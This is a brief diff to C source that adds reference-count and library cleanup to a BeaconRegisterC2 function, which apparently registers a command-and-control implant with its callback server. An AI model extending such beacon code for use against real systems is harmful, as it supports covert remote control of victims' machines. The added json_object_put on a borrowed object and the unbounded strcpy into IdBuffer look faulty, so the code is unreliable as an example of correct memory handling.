@@ -301,6 +301,10 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     parsed_json = json_object_object_get(parsed_json, "id");
     strcpy(IdBuffer, json_object_get_string(parsed_json));
 
+    // Decrement json object reference count
+    json_object_put(parsed_json);
+    // Free WinHTTP.dll
+    FreeLibrary(hWinHTTPdll);
     return TRUE;
 }
 
